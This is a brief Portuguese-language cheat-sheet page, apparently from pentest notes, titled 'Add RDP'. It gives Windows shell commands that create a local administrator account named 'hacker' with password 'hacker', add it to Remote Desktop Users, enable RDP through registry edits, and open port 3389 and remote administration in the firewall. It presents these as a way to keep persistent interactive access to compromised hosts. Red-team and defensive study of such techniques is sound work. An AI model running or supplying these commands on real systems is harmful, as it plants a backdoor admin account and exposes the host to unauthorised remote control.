---
title: "Add RDP"
---

# Add RDP

Criação de usuário local com privilégios de administrador e Remote Desktop User, habilitando RDP via registro e firewall. Útil para manter acesso persistente e interativo em hosts Windows.

```shell
net user hacker hacker /add
net localgroup administrators hacker /add
net localgroup "Remote Desktop Users" hacker /add

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"
netsh firewall set service remoteadmin enable
```
